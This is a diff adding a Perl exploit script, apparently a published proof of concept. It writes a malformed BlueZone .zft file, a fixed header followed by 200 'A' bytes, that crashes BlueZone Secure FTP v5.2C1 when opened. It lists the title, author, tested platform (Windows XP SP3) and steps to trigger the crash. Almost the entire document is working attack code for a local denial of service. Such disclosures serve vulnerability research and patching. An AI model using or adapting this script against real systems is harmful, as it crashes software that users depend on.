@@ -1,0 +1,17 @@
+#!/usr/bin/perl -w
+# Exploit Title: BlueZone Desktop Malformed .zft ffeil Local Denial of Service
+# Date: 24-10-11
+# Author: Iolo Morganwg
+# Version: BlueZone Secure FTP v5.2C1 Build 1469
+# Download: http://www.rocketsoftware.com/bluezone/products/secure-ftp/downloads/secure-ftp
+# Tested on: Windows XP SP3
+
+#To trigger: Run script {chwilfriwio.pl}, open with BlueZoneFTP, program dies - horribly!.
+ 
+my $ffeil = "chwilfriwio.zft";
+my $head = "BFTP100EKColorsVCustom@";
+my $junk = "A" x 200;
+ 
+open($ffeil, ">$ffeil");
+print $ffeil $head.$junk;
+close($ffeil);
